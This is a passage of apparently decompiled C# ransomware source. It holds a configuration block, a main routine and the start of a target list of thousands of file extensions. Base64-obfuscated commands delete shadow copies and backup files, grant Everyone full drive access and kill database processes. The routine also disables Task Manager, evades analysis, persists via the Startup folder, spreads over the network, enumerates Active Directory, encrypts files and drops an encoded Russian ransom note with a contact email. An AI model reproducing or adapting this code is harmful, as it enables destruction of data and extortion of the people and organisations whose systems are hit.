		Base64Decode(ReverseString("kVGZuV3bi5Wd9UmepNHeh12LgojZ942bvAiOm1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		Base64Decode(ReverseString("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string PowerList = Base64Decode("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> delList = new List<string>
	{
		Base64Decode("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> DrvList = new List<string>
	{
		Base64Decode("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		Base64Decode("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		Base64Decode("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string DelayedActivation = "NO";

	public static string ExpireOption = "NO";

	internal static DateTime ActiveAfterDateTime = new DateTime(2000, 1, 1);

	internal static DateTime ExpireAfterDateTime = new DateTime(2100, 1, 1);

	public static string PartialEncrytion = "YES";

	public static string PartialSize = "10";

	public static string StaticLooks = "NO";

	public static string SystemFiles = "NO";

	public static string RIPmeBiot = "NO";

	public static string ADMINISTRATOR = "YES";

	public static string FAC = "NO";

	public static string Styler = "NO";

	public static List<string> extstyl = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string LimitMe = "NO";

	public static string MaxSize = "1";

	public static string TransparentMan = "NO";

	public static string AlternateAlgo = "NO";

	public static string Jerry = "NO";

	public static string toolLocation = string.Empty;

	public static string Drag_Drop = "NO";

	public static string NotifyMe = "YES";

	public static string NotifyCustom = "YES";

	public static string LegalTitle = "0JLQvdC40LzQsNC90LjQtSDQktC90LjQvNCw0L3QuNC1INCS0L3QuNC80LDQvdC40LUh";

	public static string LegalText = "0JTQvtCx0YDRi9C5INC00LXQvdGMLiDQoyDQktCw0YEg0LLQvtC30L3QuNC60LvQuCDRgdC70L7QttC90L7RgdGC0Lgg0L3QsCDRgNCw0LHQvtGC0LU/IA0K0J3QtSDRgdGC0L7QuNGCINC/0LXRgNC10LbQuNCy0LDRgtGMLCDQvdCw0YjQuCBJVC3RgdC/0LXRhtC40LDQu9C40YHRgtGLINC/0L7QvNC+0LPRg9GCINCS0LDQvC4NCtCU0LvRjyDRjdGC0L7Qs9C+INC90LDQv9C40YjQuNGC0LUg0L/QvtC20LDQu9GD0LnRgdGC0LAg0L3QsNC8INC90LAg0L/QvtGH0YLRgy4NCg0K0J3QsNGIIGVtYWlsIC0gc2VjdXJlODIyQG1zZ3NhZmUuaW8NCg0K0KXQvtGA0L7RiNC10LPQviDQuCDQv9GA0L7QtNGD0LrRgtC40LLQvdC+0LPQviDQtNC90Y8h";

	public static string Upper = "NO";

	public static string LANShares = "YES";

	public static string ProcessAll = "NO";

	public static string ReleaseAllFiles = "NO";

	public static string FixMBR = "NO";

	public static string LogonPass = "LOGONISOFF";

	public static string VeryBasicMode = "NO";

	public static string HorseMount = "YES";

	public static string MyStartName = "reload1.lnk";

	public static string SkipC = "NO";

	public static string CatchDrv = "YES";

	public static string RichText = "NO";

	public static string CredActivate = "NO";

	public static string MySign = "VGhhbm9z";

	public static string Sniffing = "YES";

	public static string Blocks = "YES";

	public static string Elevated = "NO";

	public static string TerminateCustomProcesses = "YES";

	public static string[] CustomProcToTerminate = new string[9] { "ragent.exe", "rmngr.exe", "rphost.exe", "1cv8.exe", "sql.exe", "sqld.exe", "mysql.exe", "mysqld.exe", "oracle.exe" };

	public static string Mmf = "YES";

	public static bool chacha = true;

	public static string ntfsmft = "YES";

	public static bool Unique = false;

	public static bool paexuse = true;

	public static bool CleanMemory = true;

	public static bool multinote = true;

	public static string DebugReport = "Debug_Log.txt";

	public static bool debugmode = false;

	public static bool printnote = true;

	public static bool localreport = true;

	public static bool AccessToken = false;

	public static bool chachapetit = true;

	public static string LocalReportFileName = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + UtilMe.UniqID() + ".txt";

	public static bool ConsoleReport = false;

	public static Stopwatch stopwatch = new Stopwatch();

	public static int ErrorFiles = 0;

	public static int ProcessedFiles = 0;

	public static bool UniqueHWID = false;

	public static string LocalHWID = ".[ID-" + UtilMe.UniqID() + "]";

	public static string[] FixDatabases = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };

	public static List<string> SpList = new List<string>();

	public static int sleeper = 0;

	public static bool Impersonation = true;

	public static bool DAEnumerate = true;

	public static bool ShowMainKEYID = false;

	public static bool NoNote = false;

	public static bool RegKeyError = false;

	public static List<string> Ip1 = new List<string>();

	public static List<string> Ip2 = new List<string>();

	public static List<string> Ip3 = new List<string>();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint lpdwLevel, uint lpdwFlags);

	private static void Main(string[] args)
	{
		try
		{
			string thisprocessname = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == thisprocessname) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			MutexHelper.CheckMutex(appGuid);
		}
		catch (Exception)
		{
		}
		try
		{
			if (Sniffing == "YES")
			{
				Thread thread = new Thread(AntiSniffer.SniffersKiller);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (Delay == "YES")
		{
			Thread.Sleep(int.Parse(DelayTime));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FAC == "YES")
		{
			try
			{
				RunPS(Base64Decode(ReverseString("==AZlxmYhNXaEByczV2YjFkclRGbvZEZlxGbvJHdu92QlxmYh5WRtASZj5WZyVmZlJHUw1UL0V2U")));
			}
			catch
			{
			}
		}
		try
		{
			if (CriticalProcess == "YES" && ProcessCritical.IsAdmin())
			{
				new AntiKill().DisTaskManager(enable: false);
				ProcessCritical.YesItIs();
			}
		}
		catch (Exception)
		{
		}
		if (Live4Ever == "YES" && ProcessCritical.IsAdmin())
		{
			new AntiKill().DisTaskManager(enable: false);
			new AntiKill().IamInmortal();
		}
		if (AntiVM == "YES")
		{
			Anti_Analysis.RunAntiAnalysis();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (DeceiveMe == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(Deceive);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (Persistence == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					rand = NextInt(0, meltList.Count);
					File.Copy(fileName, text + meltList[rand], overwrite: true);
					Process.Start(text + meltList[rand]);
					CleanMyStuff();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (DelayedActivation == "YES" && DateTime.Now < ActiveAfterDateTime)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (ExpireOption == "YES" && DateTime.Now > ExpireAfterDateTime)
			{
				CleanMyStuff();
			}
		}
		catch
		{
		}
		TerminateSnooper();
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(scList, delegate(string sc)
			{
				ProcessCommand(Base64Decode("c2MuZXhl"), sc);
			});
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Parallel.ForEach(netShadowList, delegate(string net)
				{
					ProcessCommand(Base64Decode("bmV0LmV4ZQ=="), net);
				});
			}
			Parallel.ForEach(taskList, delegate(string task)
			{
				ProcessCommand(Base64Decode("dGFza2tpbGwuZXhl"), task);
			});
			if (TerminateCustomProcesses == "YES")
			{
				Parallel.ForEach(CustomProcToTerminate, delegate(string task)
				{
					ProcessCommand(Base64Decode("dGFza2tpbGwuZXhl"), "/IM " + task + " /f");
				});
			}
			if (!getOSInfo().Contains("XP"))
			{
				Empowered(PowerList);
			}
			else
			{
				Parallel.ForEach(vssList, delegate(string vs)
				{
					ProcessCommand(Base64Decode(ReverseString("lhXZu4WatRWYzNnd")), vs);
				});
			}
			Parallel.ForEach(delList, delegate(string delme)
			{
				ProcessCommand(Base64Decode("ZGVsLmV4ZQ=="), delme);
			});
		});
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			if (!DizonList.Contains(currentDirectory))
			{
				DizonList.Add(currentDirectory);
			}
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains("PriorityPath="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !DizonList.Contains(text6) && text6 != "X:\\CustomPath1" && text6 != "Z:\\CustomPath2" && text6 != "\\\\Domain\\Path\\Folder")
								{
									DizonList.Add(text6);
								}
							}
						}
					}
					if (text3.Contains("Network="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "true")
						{
							LANShares = "YES";
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "false")
						{
							LANShares = "NO";
						}
					}
					if (text3.Contains("ConsoleMode="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "true")
						{
							ConsoleReport = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "false")
						{
							ConsoleReport = false;
						}
					}
					if (text3.Contains("DebugLog="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "true")
						{
							debugmode = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "false")
						{
							debugmode = false;
						}
					}
					if (text3.Contains("ImpersonateExplorer="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "true")
						{
							Impersonation = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "false")
						{
							Impersonation = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, "Configuration text file error: " + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (LANShares == "NO")
		{
			AddShares();
		}
		if (DAEnumerate)
		{
			try
			{
				Console.WriteLine("Active Directory scanning in process...");
				LDAP.DAEmnumerate();
			}
			catch (Exception ex6)
			{
				if (debugmode)
				{
					try
					{
						File.AppendAllText(DebugReport, "Active Directory Scanning Error: " + ex6.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (LANShares == "YES")
		{
			try
			{
				MapDrv();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && CleanMemory)
			{
				try
				{
					Thread thread4 = new Thread(Monitor.RunningProcesses);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ProcessCommand("cmd.exe", Base64Decode("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
		}
		if (SpreadOverNetwork == "YES" && Internet() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(NetworkSpreading.Run);
			thread5.IsBackground = false;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		if (!(WoL == "YES"))
		{
		}
		SecureString secureString = new SecureString();
		if (StaticLooks == "NO")
		{
			DynamicPass = RandomIV.GetRandomBytes(32);
			once = RandomIV.GetRandomSaltAsString();
		}
		else
		{
			DynamicPass = "DJU8PXS51M5M0VI2UFKN4XT2HH3Y5H53";
		}
		UniqueId = CryptographyHelper.Encrypt(DynamicPass + once);
		try
		{
			if (!Unique)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Base64Decode("U09GVFdBUkVcS0VZSURcbXlLZXlJRA=="));
				if (registryKey != null)
				{
					registryKey.SetValue(Base64Decode("SUQ=") + (registryKey.ValueCount + 1), UniqueId);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Base64Decode("U09GVFdBUkVcS0VZSURcbXlLZXlJRA=="));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(Base64Decode("SUQ=") + (registryKey.ValueCount + 1), UniqueId);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			RegKeyError = true;
		}
		if (NotifyMe == "YES")
		{
			SetKeysIfAdmin();
		}
		if (localreport)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), LocalReportFileName)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), LocalReportFileName), string.Concat(Base64Decode("Q2xpZW50IElQOiA="), new WebClient().DownloadString(Base64Decode("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), UniqueId));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), LocalReportFileName), "\r\nAdditional KeyID: " + UniqueId);
				}
			}
			catch (Exception ex11)
			{
				if (debugmode)
				{
					try
					{
						File.AppendAllText(DebugReport, "Error while creating Local Report: " + ex11.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!NoNote || RegKeyError)
		{
			Shortcut.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), MyStartName), LeaveRegards(UniqueId), null, null, "Installer...", "Ctrl+Shift+X", null);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			EnableLong();
		}
		try
		{
			try
			{
				if (ConsoleReport)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch
			{
			}
			Crypt(new string[1] { "[auto]" }, new string[4824]
			{
				"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
				"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
				"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
				"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
				"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
				"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
				"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
				"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
				"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
				"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
				"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
				"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
				"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
				"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
				"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
				"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
				"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
				"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
				"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
				"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
				"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
				"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
				"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
				"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
				"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
				"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
				"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
				"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
				"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
				"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
				"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
				"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
				"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
				"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
				"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
				"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
				"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
				"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
				"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
				"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
				"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
				"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
				"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
				"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
				"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
				"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
				"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
				"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
				"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
				"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
				"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
				"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
				"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
				"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
				"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
				"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
				"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
				"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
				"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
				"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
				"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
				"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
				"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
				"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
				"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
				"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
				"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
				"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
				"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
				"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
				"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
				"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
				"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
				"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
				"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
				"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
				"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
				"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
				"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
				"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
				"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
				"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
				"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
				"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
				"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
				"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
				"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
				"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
				"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
				"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
				"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
				"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
				"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
				"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
				"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
				"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
				"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
				"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
				"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
				"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
				"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
				"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
				"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
				"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
				"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
				"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
				"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
				"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
				"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
				"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
				"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
				"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
				"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
				"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
				"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
				"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
				"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
				"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
				"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
				"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
				"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
				"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
				"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
				"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
				"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
